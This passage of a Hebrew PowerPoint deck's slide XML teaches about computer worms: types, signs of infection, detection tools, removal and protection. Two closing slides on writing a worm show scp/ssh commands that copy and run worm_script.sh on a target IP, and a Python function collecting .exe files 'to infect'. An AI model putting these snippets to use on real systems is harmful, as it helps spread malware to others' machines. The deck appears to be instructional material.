            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2483387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DE45BE7-84BA-433D-AB73-9D4622F51056}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7951304" y="642594"/>
            <a:ext cx="3173896" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>סוגי תולעים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A0A07B28-A293-45A8-A4F1-49FF815F34A6}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים שדורשות פעולה של המשתמש:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תולעים שמפיצות את עצמן דרך קישורים או קבצים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כמו התולעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ILOVEYOU</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שדורשת מהמשתמש לפתוח קובץ מצורף.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תולעים אוטומטיות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תולעים שמשתמשות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0" err="1"/>
              <a:t>בפגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> אוטומטיות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כמו התולעת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Blaster</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהתפשטה על ידי ניצול פגיעות ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Windows</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1380606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726BFA-91A5-4705-B835-A0BE26886C26}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6450496" y="642594"/>
            <a:ext cx="4674704" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כיצד לזהות תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{46752BF4-6525-49D8-A220-7E39F65DCD80}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>סימנים אפשריים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. ביצועים נמוכים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם המחשב מתחיל לפעול לאט בצורה לא רגילה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. תעבורה רשת גבוהה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם יש שימוש גבוה ולא רגיל ברוחב הפס.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. שינויים בלתי צפויים בקבצים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם יש שינויים בקבצים או בתיקיות מבלי שהתבצעה פעולה ידנית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>4. שגיאות תוכנה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הופעת שגיאות או התרעות לא רגילות בתוכנה או במערכת ההפעלה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>כלים לזיהוי</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנליזות רשת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כלי כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Wireshark</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יכול לסייע בניתוח תעבורת הרשת ולזהות פעילות חשודה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>תוכנות אנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כלים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ClamAV</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או פתרונות מסחריים יכולים לסייע בהגנה ובזיהוי תולעים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="481651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14BFFA6-EBAE-482E-98DA-E238331BDC66}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5595730" y="642594"/>
            <a:ext cx="5529470" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>התמודדות עם תולעים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{90C58075-F17C-4772-B94E-345BB72FD2CC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פעולות למניעת התפשטות:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. עדכונים שוטפים</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ודא שכל התוכנות והמערכות מעודכנות כדי לתקן </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>פגיעויות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. חומת אש</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש בחומת אש כדי למנוע גישה לא מורשית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. בקרת גישה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הגבל את הגישה למערכות ויישומים רגישים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הסרת תולעים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. סריקות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: השתמש בכלים מתקדמים לסריקת המחשב ולאיתור תולעים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. שחזור מערכת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: ייתכן שיהיה צורך לשחזר את המערכת מ-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Backup </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לא נקי מתולעים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2122756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3CB112-1D22-479C-A187-FDF3494D280D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6480312" y="642594"/>
            <a:ext cx="4644887" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הגנה מפני תולעים</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1D88AFE4-30A2-41DD-B048-83B4E62647FC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יש כמה צעדים שניתן לנקוט כדי להגן על מערכות מפני תולעים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>עדכוני אבטחה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הקפדה על עדכון מערכות הפעלה ותוכנות בעדכוני האבטחה האחרונים היא קריטית כדי למנוע תולעים שמנצלות חולשות מוכרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חומות אש </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:Firewall</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>חומות אש יכולות לחסום תעבורה חשודה ולמנוע מהתולעת לגשת לרשת או למחשבים אחרים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אנטי-וירוס</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: שימוש בתוכנות אנטי-וירוס ואנטי-תולעים יכול לעזור בזיהוי וחסימת תולעים לפני שהן מצליחות להתפשט.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>חינוך והכשרה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: משתמשים צריכים להיות מודעים לסכנות של תולעים וללמוד איך להימנע מלהוריד ולהריץ קבצים חשודים או ללחוץ על קישורים זדוניים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שימוש בכלי ניטור</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כלים כמו </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> IDS/IPS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יכולים לזהות דפוסי תעבורה חשודים שמעידים על נוכחות תולעת ברשת.</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="34980993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FAF8CEC-9409-4582-8DBD-66FEF156EB63}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4701209" y="0"/>
            <a:ext cx="6503504" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פרקטיקות לכתיבת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60B7FE1E-9D8F-45BB-B082-867A09B137FE}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="1093304"/>
            <a:ext cx="10058400" cy="5655366"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>גנרליות</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>1. אחריות</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תתנסה בכתיבת תולעת רק בסביבות מבוקרות לצורכי למידה והבנה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>2. תכנון</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: תכנן את התולעת כך שתהיה מסוגלת לבצע את מטרותיה מבלי לפגוע במערכות או נתונים חשובים.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>3. מניעת גישה לא מורשית</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הימנע מלפגוע במערכות שלא נועדו למטרות ניסוי.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>IP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> של היעד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>TARGET_IP="192.168.1.100"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>קובץ שיש לשלוח</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>FILE_TO_SEND="/path/to/your/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>worm_script.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>יצירת חיבור והעברת הקובץ</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>scp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> $FILE_TO_SEND user@$TARGET_IP:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הרצת הקובץ ביעד</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ssh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> user@$TARGET_IP 'bash /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>tmp</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>worm_script.sh</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>'</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2984714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EBFC21-DF93-48A0-A621-18A68CB93703}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3538330" y="642594"/>
            <a:ext cx="7586870" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שלבים בסיסיים ביצירת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{082AA709-1B58-4E39-B2EF-BDD5963B8C17}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="85000" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>זיהוי קבצים רלוונטיים להפצה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>על התולעת לזהות קבצים או תיקיות שבהם היא תשתכפל. בדרך כלל מדובר בקבצים הפופולריים כמו קבצי מערכת או קבצי תוכנות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמה לפונקציה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>find_files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = []</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirnames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, filenames in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.walk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        for file in filenames:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>file.endswith</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(".exe"):  # Example: Looking for EXE files</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>                </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect.append</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.path.join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, file))</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
